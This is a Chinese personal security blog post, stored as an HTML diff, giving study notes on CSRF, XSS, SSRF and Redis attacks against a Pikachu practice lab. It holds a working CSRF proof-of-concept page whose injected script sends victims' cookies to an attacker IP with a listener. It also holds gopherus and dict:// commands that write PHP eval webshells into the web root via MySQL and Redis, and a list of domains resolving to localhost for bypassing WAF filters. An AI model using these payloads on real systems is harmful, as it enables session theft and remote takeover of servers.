@@ -1,0 +1,227 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>no.7 | 欢迎来到我的博客</title><meta name="author" content="仰泳鱼"><meta name="copyright" content="仰泳鱼"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CSRF客户端请求伪造（低危） c用户–登录—&gt;A站(csrf漏洞)C用户点击了b用户发的恶意链接b以c用户的身份向a站发送了功能请求CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用 CSRF最关键的是利用受害者的cookie向服务器发送伪造请求所以如果受害者之前用Chrome浏览器登录的这个系统，而用火狐浏览器点击这个链接，攻击是不会触发的因为火狐浏览器并不能利">
+<meta property="og:type" content="article">
+<meta property="og:title" content="no.7">
+<meta property="og:url" content="http://example.com/2024/08/08/2024-08-08/index.html">
+<meta property="og:site_name" content="欢迎来到我的博客">
+<meta property="og:description" content="CSRF客户端请求伪造（低危） c用户–登录—&gt;A站(csrf漏洞)C用户点击了b用户发的恶意链接b以c用户的身份向a站发送了功能请求CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用 CSRF最关键的是利用受害者的cookie向服务器发送伪造请求所以如果受害者之前用Chrome浏览器登录的这个系统，而用火狐浏览器点击这个链接，攻击是不会触发的因为火狐浏览器并不能利">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/07/11/hkNDJcFqupasnZV.webp">
+<meta property="article:published_time" content="2024-08-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-09T10:30:49.068Z">
+<meta property="article:author" content="仰泳鱼">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/07/11/hkNDJcFqupasnZV.webp"><link rel="shortcut icon" href="https://www.emojiall.com/images/240/emojione/1f1e8-1f1f3.png"><link rel="canonical" href="http://example.com/2024/08/08/2024-08-08/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'no.7',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-08-09 18:30:49'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/07/11/Dl2NuA1dKsQm3wn.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 作者</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2024/07/11/hkNDJcFqupasnZV.webp')"><nav id="nav"><span id="blog-info"><a href="/" title="欢迎来到我的博客"><span class="site-name">欢迎来到我的博客</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 作者</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">no.7</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-08-07T16:00:00.000Z" title="发表于 2024-08-08 00:00:00">2024-08-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-09T10:30:49.068Z" title="更新于 2024-08-09 18:30:49">2024-08-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%97%A5%E5%BF%97/">日志</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="no.7"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>客户端请求伪造（低危）</p>
+<p>c用户–登录—&gt;A站(csrf漏洞)<br>C用户点击了b用户发的恶意链接<br>b以c用户的身份向a站发送了功能请求<br>CSRF与XSS最大的区别就在于，<strong>CSRF并没有盗取cookie而是直接利用</strong></p>
+<p>CSRF最关键的是<strong>利用受害者的cookie向服务器发送伪造请求</strong><br>所以如果受害者之前用Chrome浏览器登录的这个系统，而用火狐浏览器点击这个链接，攻击是不会触发的<br>因为火狐浏览器<strong>并不能利用Chrome浏览器的cookie</strong>，所以会自动跳转到登录界面</p>
+<p>通过使用<strong>短链接</strong>来隐藏URL</p>
+<p>具体步骤：<br>1、进入需要的操作界面f12扒取原代码（复制元素）或者劫持操作请求<br>2、生成poc作为文件，修改后缀为html<br>3、给用户点击</p>
+<h1 id="XSS-CSRF"><a href="#XSS-CSRF" class="headerlink" title="XSS+CSRF"></a>XSS+CSRF</h1><p>xxx部分填入自己的ip，目的是监听目标传入的cookie<br>form action&#x3D;填目标可进行操作的域名</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.0.215/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=1<span class="symbol">&amp;amp;</span>phonenum=1<span class="symbol">&amp;amp;</span>add=1<span class="symbol">&amp;amp;</span>email=<span class="symbol">&amp;amp;</span>submit=submit&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">name</span>=<span class="string">&quot;form1&quot;</span>  &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;&lt;script&gt;new Image().src=&quot;http://xxx.xxx.xxx.xxx:8080/?c=&quot;+document.cookie;&lt;/script&gt;&#x27;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;&lt;script&gt;new Image().src=&quot;http://xxx.xxx.xxx.xxx:8080/?c=&quot;+document.cookie;&lt;/script&gt;&#x27;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>&#96;</p>
+<p>端口监听：python -m http.server 8080（当用户点击以上代码时获取cookie）<br><img src="/../img/Pasted%20image%2020240808114851.png"><br>netstat -ano|findstr 8000 <em>查看端口是否占用</em><br>taskkill &#x2F;pid 进程号 &#x2F;F <em>解决占用进程</em></p>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>服务器请求伪造<br>与远程文件包含漏洞的区别：<br>远端加载进来就是<br>不生效就是远程文件包含<br>利用方式：四种协议<br><img src="/../img/Pasted%20image%2020240808153037.png"><br><img src="/../img/Pasted%20image%2020240809112421.png"><br>gopher生成ssrf</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit mysql</span><br><span class="line">root</span><br><span class="line">select <span class="string">&quot;&lt;?php @eval(<span class="subst">$_POST</span>[a]);?&gt;&quot;</span>into outfile <span class="string">&#x27;/var/www/html/6.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">python2 gopherus.py --exploit redis</span><br><span class="line">phpshell</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]);<span class="meta">?&gt;</span>; *或者默认*</span><br><span class="line"></span><br><span class="line">shell.php?cmd=<span class="string">&quot;whomai&quot;</span> *网站url执行命令，因为如果蚂蚁剑无法连接，证明只能系统命令*</span><br></pre></td></tr></table></figure>
+<h1 id="ssrf攻击redis数据库"><a href="#ssrf攻击redis数据库" class="headerlink" title="ssrf攻击redis数据库"></a>ssrf攻击redis数据库</h1><p>默认无密码，默认端口6379，四种拿权限方式<br><img src="/../img/Pasted%20image%2020240809112934.png"><br>1、dict扫描内网ip与端口，写webshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dict:<span class="comment">//localhost:6378/flushall *刷新*</span></span><br><span class="line">dict:<span class="comment">//localhost:6378/config:set:dir:/var/www/html/app1 *定义目录*</span></span><br><span class="line">dict:<span class="comment">//localhost:6378/config:set:dbfilename:hh.php *文件名*</span></span><br><span class="line">dict:<span class="comment">//localhost:6378/set:1:&quot;\x3c\x3f\x70\x68\x70\x20\x40\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x77\x5d\x29\x3b\x3f\x3e&quot; *一句话木马并且Unicode中文编码*</span></span><br><span class="line">dict:<span class="comment">//localhost:6378/save</span></span><br><span class="line"></span><br><span class="line">webshell密码w</span><br></pre></td></tr></table></figure>
+<h1 id="一些公共-http-域名，但是解析到-127-0-0-1"><a href="#一些公共-http-域名，但是解析到-127-0-0-1" class="headerlink" title="一些公共 http 域名，但是解析到 127.0.0.1"></a>一些公共 http 域名，但是解析到 127.0.0.1</h1><p>如下绕过waf（localhost）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://safe.taobao.com/</span><br><span class="line">http://114.taobao.com/</span><br><span class="line">http://wifi.aliyun.com/</span><br><span class="line">http://imis.qq.com/</span><br><span class="line">http://localhost.sec.qq.com/</span><br><span class="line">http://ecd.tencent.com/</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">仰泳鱼</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/08/08/2024-08-08/">http://example.com/2024/08/08/2024-08-08/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">欢迎来到我的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2024/07/11/hkNDJcFqupasnZV.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/09/2024-08-09/" title="no.8"><img class="cover" src="https://s2.loli.net/2024/07/11/ZGr2mBLazCbIUAt.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">no.8</div></div></a></div><div class="next-post pull-right"><a href="/2024/08/07/2024-08-07/" title="no.6"><img class="cover" src="https://s2.loli.net/2024/07/11/bKrwGlYSe5hQ8xf.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">no.6</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/07/11/Dl2NuA1dKsQm3wn.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">仰泳鱼</div><div class="author-info__description">仅供分享个人研究成果</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/1234567fang"><i class="fab fa-github"></i><span>关注我</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/1234567fang" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">今日事，今日毕</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">1.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-CSRF"><span class="toc-number">2.</span> <span class="toc-text">XSS+CSRF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">3.</span> <span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssrf%E6%94%BB%E5%87%BBredis%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">4.</span> <span class="toc-text">ssrf攻击redis数据库</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%85%AC%E5%85%B1-http-%E5%9F%9F%E5%90%8D%EF%BC%8C%E4%BD%86%E6%98%AF%E8%A7%A3%E6%9E%90%E5%88%B0-127-0-0-1"><span class="toc-number">5.</span> <span class="toc-text">一些公共 http 域名，但是解析到 127.0.0.1</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/08/10/2024-08-10/" title="no.9"><img src="https://s2.loli.net/2024/07/11/hkNDJcFqupasnZV.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="no.9"/></a><div class="content"><a class="title" href="/2024/08/10/2024-08-10/" title="no.9">no.9</a><time datetime="2024-08-09T16:00:00.000Z" title="发表于 2024-08-10 00:00:00">2024-08-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/09/2024-08-09/" title="no.8"><img src="https://s2.loli.net/2024/07/11/ZGr2mBLazCbIUAt.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="no.8"/></a><div class="content"><a class="title" href="/2024/08/09/2024-08-09/" title="no.8">no.8</a><time datetime="2024-08-08T16:00:00.000Z" title="发表于 2024-08-09 00:00:00">2024-08-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/08/2024-08-08/" title="no.7"><img src="https://s2.loli.net/2024/07/11/hkNDJcFqupasnZV.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="no.7"/></a><div class="content"><a class="title" href="/2024/08/08/2024-08-08/" title="no.7">no.7</a><time datetime="2024-08-07T16:00:00.000Z" title="发表于 2024-08-08 00:00:00">2024-08-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/07/2024-08-07/" title="no.6"><img src="https://s2.loli.net/2024/07/11/bKrwGlYSe5hQ8xf.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="no.6"/></a><div class="content"><a class="title" href="/2024/08/07/2024-08-07/" title="no.6">no.6</a><time datetime="2024-08-06T16:00:00.000Z" title="发表于 2024-08-07 00:00:00">2024-08-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/06/2024-08-06/" title="no.5"><img src="https://s2.loli.net/2024/07/11/ZGr2mBLazCbIUAt.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="no.5"/></a><div class="content"><a class="title" href="/2024/08/06/2024-08-06/" title="no.5">no.5</a><time datetime="2024-08-05T16:00:00.000Z" title="发表于 2024-08-06 00:00:00">2024-08-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By 仰泳鱼</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaid.length === 0) return
+  const runMermaid = () => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from($mermaid).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const loadMermaid = () => {
+    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid@10.8.0/dist/mermaid.min.js').then(runMermaid)
+  }
+
+  btf.addGlobalFn('themeChange', runMermaid, 'mermaid')
+
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
